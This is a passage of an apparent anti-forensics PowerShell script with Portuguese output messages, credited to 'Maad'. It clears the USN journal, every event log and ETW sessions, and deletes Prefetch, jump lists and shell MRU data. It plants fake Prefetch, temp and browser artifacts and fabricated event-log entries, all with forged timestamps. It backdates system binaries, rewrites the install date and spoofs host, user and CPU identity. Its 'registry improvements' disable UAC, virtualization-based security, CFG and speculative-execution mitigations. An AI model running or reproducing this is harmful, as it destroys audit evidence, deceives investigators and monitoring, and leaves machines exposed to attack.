    Write-Host "[+] - USN Journal Limpo" -ForegroundColor Green
} catch {
    Write-Host "[!] - Error Limpeza USN Journal: $_" -ForegroundColor Red
}
Clear-Host

# 3. Clean Event Logs
$logs = wevtutil el
foreach ($log in $logs) {
    try { 
        wevtutil cl "$log" | Out-Null
        Write-Host "[+] - Limpando log: $log" -ForegroundColor Green
    } 
    catch {
        Write-Host "[!] Error Limpeza log $log : $_" -ForegroundColor Red
    }
}

Clear-Host

# 4. Clean and create fake Prefetch
$prefetchPath = "$env:SystemRoot\Prefetch"
if (Test-Path $prefetchPath) {
    try {
        Remove-Item "$prefetchPath\*" -Force -Recurse -ErrorAction SilentlyContinue
        Write-Host "[+] - Prefetch Limpo!" -ForegroundColor Green
        
        $prefetchCount = Get-Random -Minimum 50 -Maximum 150
        foreach ($prog in $programs | Get-Random -Count $prefetchCount) {
            $file = "$prefetchPath\$prog-$(Get-Random -Minimum 10000000 -Maximum 99999999).pf"
            $size = Get-Random -Minimum 524288 -Maximum 3145728
            $data = New-Object byte[] $size
            (New-Object Random).NextBytes($data)
            [IO.File]::WriteAllBytes($file, $data)
            
            $fileTime = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 90))
            Set-FileTime -FilePath $file -NewTime $fileTime
        }
        Write-Host "[+] - Criando $prefetchCount Falsos Log" -ForegroundColor Green
    } 
    catch {
        Write-Host "[!] - Error Prefetch: $_" -ForegroundColor Red
    }
}


$tempPaths = @($env:TEMP, "$env:SystemRoot\Temp", "$env:LOCALAPPDATA\Temp")

function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    if (Test-Path $FilePath) {
        $item = Get-Item $FilePath
        $item.CreationTime = $NewTime
        $item.LastWriteTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 300))
        $item.LastAccessTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 600))
    }
}

foreach ($temp in $tempPaths) {
    if (-not (Test-Path $temp)) {
        New-Item -Path $temp -ItemType Directory -Force | Out-Null
    }

    foreach ($prog in ($programs | Get-Random -Count 152)) {
        $fileType = Get-Random -InputObject @(".tmp", ".log", ".cache", ".dat")
        $fileName = "$prog$(Get-Random -Minimum 1000 -Maximum 9999)$fileType"
        $filePath = Join-Path $temp $fileName
        
        $size = Get-Random -Minimum 10240 -Maximum 1048576 # 10KB-1MB
        $data = New-Object byte[] $size
        (New-Object Random).NextBytes($data)
        [IO.File]::WriteAllBytes($filePath, $data)
        
        $fileTime = (Get-Date).AddHours(-(Get-Random -Minimum 1 -Maximum 720))
        Set-FileTime -FilePath $filePath -NewTime $fileTime
        
        Write-Host "[+] - Criando Falso Temp Files: $filePath" -ForegroundColor Green
    }
}

Write-Host "`n[+] - Geração de arquivos temporários falsos concluída!" -ForegroundColor Green
Clear-Host
Write-Host "`n[FASE 3] Criando artefatos falsos..." -ForegroundColor Green


# 5. Create fake temp files 
$tempPaths = @($env:TEMP, "$env:SystemRoot\Temp", "$env:LOCALAPPDATA\Temp", "$env:USERPROFILE\AppData\Local\Temp")
foreach ($temp in $tempPaths) {
    if (Test-Path $temp) {
        try {
            $tempFileCount = Get-Random -Minimum 30 -Maximum 100
            foreach ($prog in $programs | Get-Random -Count $tempFileCount) {
                $fileType = Get-Random -InputObject @(".tmp", ".log", ".cache", ".bak", ".dat", ".dmp", ".old", ".temp")
                $fileName = "$prog$(Get-Random -Minimum 1000 -Maximum 9999)$fileType"
                $filePath = Join-Path $temp $fileName
                
                $size = Get-Random -Minimum 10240 -Maximum 1048576
                $data = New-Object byte[] $size
                (New-Object Random).NextBytes($data)
                [IO.File]::WriteAllBytes($filePath, $data)
                
                # Set realistic timestamps
                $fileTime = (Get-Date).AddHours(-(Get-Random -Minimum 1 -Maximum 720))
                Set-FileTime -FilePath $filePath -NewTime $fileTime
            }
            Write-Host "[+] - Criando $tempFileCount Falso temp file no $temp" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] - Error de criacao no temp $temp : $_" -ForegroundColor Red
        }
    }
}

# 6. Create fake program execution artifacts
$executionArtifacts = @(
    "$env:APPDATA\Microsoft\Windows\Recent",
    "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations",
    "$env:LOCALAPPDATA\Microsoft\Windows\History",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
    "$env:LOCALAPPDATA\Mozilla\Firefox\Profiles"
)

foreach ($path in $executionArtifacts) {
    if (Test-Path $path) {
        try {
            $artifactCount = Get-Random -Minimum 5 -Maximum 20
            foreach ($prog in $programs | Get-Random -Count $artifactCount) {
                $fileType = Get-Random -InputObject @(".automaticDestinations-ms", ".customDestinations-ms", ".dat", ".log", ".db", ".cache")
                $fileName = "$(Get-Random -Minimum 10000000 -Maximum 99999999)$fileType"
                $filePath = Join-Path $path $fileName
                
                $size = Get-Random -Minimum 1024 -Maximum 1048576
                $data = New-Object byte[] $size
                (New-Object Random).NextBytes($data)
                [IO.File]::WriteAllBytes($filePath, $data)
                $fileTime = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 60))
                Set-FileTime -FilePath $filePath -NewTime $fileTime
            }
            Write-Host "[+] - Criação de Artefatos em $path" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] - Error de criação de artefatos em $path : $_" -ForegroundColor Red
        }
    }
}
Clear-Host
Write-Host "`n[FASE 4] Gerando eventos falsos..." -ForegroundColor Green

#7 Fake Event
function nonEvent {
    param (
        [string]$Program,
        [string]$Message,
        [string]$LogType = "Application"
    )

    $eventId = Get-Random -Minimum 1000 -Maximum 9999
    $source = "$Program $(Get-Random -InputObject @('Service','Provider','Manager','Host','Daemon')) $(Get-Date -Format HHmmssfff)"
    $msg = "$Message`n`nProcess ID: $(Get-Random -Minimum 1000 -Maximum 9999)`nThread ID: $(Get-Random -Minimum 1000 -Maximum 9999)`nUser: $env:USERNAME`nComputer: $env:COMPUTERNAME"

    try {
        New-EventLog -LogName $LogType -Source $source -ErrorAction SilentlyContinue
        Write-EventLog -LogName $LogType -Source $source -EntryType Information -EventId $eventId -Message $msg
        Write-Host "[+] - Criação de Evento em $LogType : $source" -ForegroundColor Green
    }
    catch {
        #Write-Host "[!] - Error creating event: $_" -ForegroundColor Red
    }
}

$eventMessages = @(
    "Application started successfully",
    "Update completed successfully",
    "Connection established to server",
    "Recoverable error detected",
    "Process terminated normally",
    "Plugin loaded successfully",
    "Backup completed",
    "Automatic verification completed",
    "Service failed to start",
    "Program requires update",
    "Connection error",
    "Architecture error detected",
    "Windows processes started with errors",
    "System failed starting svchost",
    "Update successful",
    "Search bar needs update",
    "License verification completed",
    "User authentication successful",
    "Data synchronization completed",
    "Cache cleared",
    "Configuration saved",
    "New version available",
    "Security scan completed",
    "Firewall rule applied",
    "Driver loaded successfully",
    "Network connection lost",
    "Reconnecting to service...",
    "Initialization complete",
    "Session started",
    "Session ended",
    "Data validation failed",
    "Retrying operation...",
    "Operation timed out",
    "Resource allocation failed",
    "Memory optimization completed",
    "Disk cleanup initiated"
)

$eventLogTypes = @("Application", "System")

foreach ($i in 1..150) {
    $program = $programs | Get-Random
    $logType = $eventLogTypes | Get-Random
    $message = $eventMessages | Get-Random
    nonEvent -Program $program -Message $message -LogType $logType
}
Clear-Host
Write-Host "`n[+] - Falso Eventos Log Finalizado!" -ForegroundColor Green
Clear-Host

function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    
    if (Test-Path $FilePath) {
        try {
            takeown /f $FilePath /a | Out-Null
            icacls $FilePath /grant Administrators:F /t /c /q | Out-Null
            
            $item = Get-Item $FilePath
            $item.CreationTime = $NewTime
            $item.LastWriteTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 300))
            $item.LastAccessTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 600))
            return $true
        }
        catch {
            Write-Host "[!] Não foi possível modificar timestamps para $FilePath : $_" -ForegroundColor Red
            return $false
        }
    }
    return $false
}

# 8. Reiniciar o Explorer de forma segura
try {
    Clear-Host
    Write-Host "[+] - Reiniciando processo Explorer..." -ForegroundColor Green
    $explorerProcesses = Get-Process -Name explorer -ErrorAction SilentlyContinue
    if ($explorerProcesses) {
        $explorerProcesses | Stop-Process -Force
        Start-Sleep -Seconds 3
    }
    Start-Process "explorer.exe"
    Write-Host "[+] - Explorer reiniciado com sucesso!" -ForegroundColor Green
} catch {
    Write-Host "[!] - Falha ao reiniciar o Explorer: $_" -ForegroundColor Red
}
function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    try {
        [System.IO.File]::SetCreationTime($FilePath, $NewTime)
        [System.IO.File]::SetLastWriteTime($FilePath, $NewTime)
        [System.IO.File]::SetLastAccessTime($FilePath, $NewTime)
        return $true
    } catch {
        return $false
    }
}

# 9 Lista de arquivos do sistema para modificar
$systemFiles = @(
    "$env:WINDIR\explorer.exe",
    "$env:WINDIR\System32\cmd.exe"
)

Write-Host "`n[+] - Modificando timestamps de arquivos do sistema..." -ForegroundColor Green
Start-Sleep -Milliseconds 500
Clear-Host

foreach ($file in $systemFiles) {
    if (Test-Path $file) {
        $fileTime = (Get-Date).AddDays(- (Get-Random -Minimum 1 -Maximum 30))
        $success = Set-FileTime -FilePath $file -NewTime $fileTime
        
        if ($success) {
            Write-Host "[+] - Timestamps modificados para $file" -ForegroundColor Green
        } else {
            Write-Host "[!] -  Não foi possível modificar $file" -ForegroundColor Red
        }
    } else {
        Write-Host "[!] - Arquivo não encontrado: $file" -ForegroundColor Red
    }
}

# 10. Limpar sessões ETW
try {
    Clear-Host
    Write-Host "`n[+] - Limpando sessões ETW..." -ForegroundColor Green
    logman stop -ets | Out-Null
    logman delete -ets | Out-Null
    Write-Host "[+] - Sessões ETW paradas e removidas com sucesso" -ForegroundColor Green
} catch {
    Write-Host "[!] - Falha ao limpar sessões ETW: $_" -ForegroundColor Red
}

# Change Date Install ( Formating Sys )
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
$newInstallDate = 1742761079
if (Test-Path $regPath) {
    try {
        Set-ItemProperty -Path $regPath -Name "InstallDate" -Value $newInstallDate -Type DWord
        Write-Host "[+] -  InstallDate alterado com sucesso para $newInstallDate (23/03/2025 21:17:59)" -ForegroundColor Green
    } catch {
        Write-Error "[!] - Erro ao alterar InstallDate: $_" -ForegroundColor Red
    }
} else {
    Write-Error "[!] - Chave de Registro não encontrada: $regPath" -ForegroundColor Red
}
Clear-Host

# 11 Change Inforamções 
$newnm = "Maad"
$newworkg = "MaadGroup"
$newdc = "Sistema personalizado por Maad"
$fakename = "Intel Quantum 9999X Turbo Maad Edition"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "srvcomment" -Value $newdc -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "srvcomment" -Value $newworkg -Force
wmic computersystem set manufacturer="$newnm"
wmic computersystem where caption='%COMPUTERNAME%' set manufacturer="$newnm"
Rename-Computer -NewName $newnm -Force -ErrorAction SilentlyContinue
$CurrentUsername = $env:USERNAME
Rename-LocalUser -Name $CurrentUsername -NewName $newnm
$cpuKey = "HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0"
Set-ItemProperty -Path $cpuKey -Name "ProcessorNameString" -Value $fakename
Write-Output "Processador falsificado com sucesso: $fakename"

#12 Limpar JumpList & Active View
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Warning "This function requires administrator privileges."
        return
    }
    Write-Host "[+] - Disabling Jump Lists..."
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name "Start_TrackDocs" -Value 0
    Set-ItemProperty -Path $regPath -Name "Start_JumpListItems" -Value 0
    $taskbarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer"
    Set-ItemProperty -Path $taskbarPath -Name "EnableAutoTray" -Value 1
    Clear-Host
    Write-Host "[+] - Limpando entradas 'LastActiveClick' e 'LastActiveView'..." -ForegroundColor White
    $regPaths = @(
      "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
      "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Modules\GlobalSettings\Sizer",
      "HKCU\Software\Microsoft\Windows\Shell\Bags",
      "HKCU\Software\Microsoft\Windows\ShellNoRoam\Bags"
    )
foreach ($path in $regPaths) {
    try {
        Remove-ItemProperty -Path $path -Name "LastActiveClick" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $path -Name "LastActiveView" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $path -Name "LastVisitedPidlMRU" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $path -Name "LastVisitedMRU" -ErrorAction SilentlyContinue
        Write-Host "[+] - Limpo: $path" -ForegroundColor Green
    } catch {
        Write-Host "[!] - Falha ao limpar: $path" -ForegroundColor Red
    }
}
$bagPaths = @(
    "$env:LOCALAPPDATA\Microsoft\Windows\Explorer"
)
foreach ($dir in $bagPaths) {
    Get-ChildItem -Path $dir -Include "thumbcache_*.db", "iconcache_*.db" -File -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Write-Host "[+] - Limpou arquivos de cache em: $dir" -ForegroundColor Green
}
Write-Host "`n[+] - Limpeza concluída." -ForegroundColor White

#13 Melhorias Registro
Clear-Host
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync" /v "SyncPolicy" /t REG_DWORD /d "5" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_DWORD /d "0" /f
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "HwSchMode" /t REG_DWORD /d "2" /f
REG ADD "HKCU\SOFTWARE\Microsoft\DirectX\UserGpuPreferences" /v "DirectXUserGlobalSettings" /t REG_SZ /d "VRROptimizeEnable=0;" /f
REG ADD "HKCU\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "0" /f
REG ADD "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "0" /f
REG ADD "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "0" /f
REG ADD "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "ShowedToastAtLevel" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\EventTranscriptKey" /v "EnableEventTranscript" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338387Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338389Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-310093Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338388Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-314563Enabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenOverlayEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "ContentDeliveryAllowed" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "OemPreInstalledAppsEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "PreInstalledAppsEverEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContentEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "FeatureManagementEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RemediationRequired" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\UserProfileEngagement" /v "ScoobeSystemSettingEnabled" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "ConfigureWindowsSpotlight" /t REG_DWORD /d "2" /f
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "IncludeEnterpriseSpotlight" /t REG_DWORD /d "0" /f
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightFeatures" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightWindowsWelcomeExperience" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightOnActionCenter" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightOnSettings" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableThirdPartySuggestions" /t REG_DWORD /d "1" /f
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableTailoredExperiencesWithDiagnosticData" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableThirdPartySuggestions" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f
REG ADD "HKLM\System\CurrentControlSet\Services\Tcpip6\Parameters" /v "DisabledComponents" /t REG_DWORD /d "255" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingCombining" /t REG_DWORD /d "1" /f
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f 
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f 
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "DisableExternalDMAUnderLock" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "16" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "16" /f
REG ADD "HKCU\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f 
REG ADD "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f 
REG ADD "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f 
REG ADD "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Executive" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\ModernSleep" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "10" /f 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
REG ADD "HKLM\System\CurrentControlSet\Control\Session Manager" /v "ProtectionMode" /t REG_DWORD /d "0" /f
